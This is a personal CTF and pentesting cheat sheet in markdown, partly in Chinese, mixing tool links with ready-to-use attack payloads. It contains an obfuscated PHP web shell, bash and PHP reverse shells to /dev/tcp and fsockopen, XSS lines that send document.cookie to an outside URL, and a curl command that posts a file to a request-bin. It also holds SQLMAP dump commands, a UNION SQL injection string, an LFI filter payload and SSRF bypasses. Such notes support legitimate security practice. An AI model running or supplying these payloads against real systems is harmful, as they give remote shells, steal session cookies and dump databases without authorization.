# Tools

## CTF Tools

* [CyberShef](https://gchq.github.io/CyberChef/#input=8J%2BNo/CfjbTwn42m8J%2BMtPCfjaLwn4278J%2BNs/CfjbTwn42l8J%2BNp/CfjaHwn42u8J%2BMsPCfjafwn42y8J%2BNofCfjbDwn42o8J%2BNufCfjZ/wn42i8J%2BNufCfjZ/wn42l8J%2BNrfCfjLDwn4yw8J%2BMsPCfjLDwn4yw8J%2BMsPCfjarwn42p8J%2BNvQo)
* [Hack Tricks](https://book.hacktricks.xyz/tunneling-and-port-forwarding)
* [Command Injection](https://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#%E5%8F%8D%E5%BC%95%E5%8F%B7%EF%BC%88%E9%87%8D%E9%9F%B3%E7%AC%A6%EF%BC%89)

### Web Shell
* https://www.webshell.cc/4422.html

### Reverse Shell
* [Reverse Shell大全](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) 
* [GitHub List Rev](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

### Crypto
* https://blog.csdn.net/qq_38780085/article/details/79305488
* [BrainFuck](https://gist.github.com/maxcountryman/1699708)

## 生活駭客

* [Word 放 Code](http://www.planetb.ca/projects/syntaxHighlighter)
* [Android 螢幕投影](https://github.com/Genymobile/scrcpy)
    * `choco install scrcpy`, `choco install adb`, `scrcpy`
* [Bash Command Search](https://ss64.com/)
* [7z-CLI-用法](https://www.cnblogs.com/sparkdev/p/5598062.html)
    ```bash
    7z.exe a <target> <source: 只能用相對路徑>
    ```
* [PCHunter Tool](https://www.bleepingcomputer.com/download/pc-hunter/)
    * Windows系統訊息查看，輔助殺毒文件
* curl 配 request-bin 傳檔
    ```bash
    (echo -n '{"payload": "'; <file>; echo '"}') | curl -H "Content-Type: application/json" -d @- <requests-bin url>
    ```

## Hacking Trick

### MD5 Collision
* somd5.com
* cmd5.com

## Paid Software Download

* [免費Java - OpenJDK download](https://adoptopenjdk.net/)
* [Patch My PC](https://patchmypc.com/home-updater)

## Shodan
![](https://i.imgur.com/qBAtBQB.png)

## Reverse Shell Upload File

* https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet


## SQLMAP

### download source

```bash
git clone https://github.com/sqlmapproject/sqlmap
```

### 起手式

```python
python sqlmap.py -o --random-a -u "url" --tamper base64encode -D <DB> -T <TABLE> --dump
```

### 各種參數

- https://xz.aliyun.com/t/3010

```
--dbs
--schema
--batch
-D
-T
--data="<post 參數>"
--random-agent
--tamper base64encode
-technique=U,B --union-cols=number --dbms-mysql
```
### app.any.run

* https://app.any.run/

### 手打

```
union select 1,2,group_concat(schema_name),4 from information_schema.schemata#
```

## PHP

### reverse shell

#### linux
```php
<?=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```

```php
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/<ip>/<port> 0>&1'");
?>
```

```php
php -r '$sock=fsockopen(<ip>,<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### LFI

```
/?path=php://filter/convert.base64-encode/resource=index.php
```

### SSRF繞過
- `127.0.0.0/8`
- `redirect`
- `http://@127.0.0.1`

```
gethostbyname('127.0.0.1') == '127.0.0.1'
gethostbyname('localhost') == '127.0.0.1'
gethostbyname('localtest.me') == '127.0.0.1'
gethostbyname('@127.0.0.1') == '@127.0.0.1'
```

## XSS

```html
<script>var i=new Image;i.src="<url>/?"+document.cookie;</script>
<svg/onload="document.location='<url>/?'+document.cookie">
```

## 滲透相關，有點東西

* https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/